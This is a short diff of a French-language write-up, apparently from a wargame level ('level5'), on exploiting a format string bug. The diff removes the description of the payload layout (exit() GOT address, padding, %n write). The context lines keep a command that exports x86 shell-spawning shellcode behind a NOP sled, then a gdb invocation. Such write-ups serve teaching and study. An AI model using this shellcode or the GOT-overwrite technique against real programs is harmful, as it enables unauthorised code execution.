@@ -96,11 +96,6 @@ Pour plus d'informations sur les format string exploit et les override d'adresse
 
 En utilisant le modifier %n de printf, on peut écrire à une adresse (habituellement celle d'une variable qui lui est fournie en paramètre) le nombre d'octets précédemment lus dans la format string.
 
-Notre payload malicieux sera donc formatté comme suit:
-- L'adresse GOT de exit() en little endian
-- %[N]d     //  Padding de N octets (N étant la représentation en int de l'adresse de notre shellcode)
-- "%[x]$n"  //  écrit N à l'adresse fournie en [x]ème paramètre (on veut pointer sur les 4 premiers octets de notre payload)
-
 `export SHELLCODE=$(python -c 'print "\x90"*1000 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')`
 
 `gdb level5`
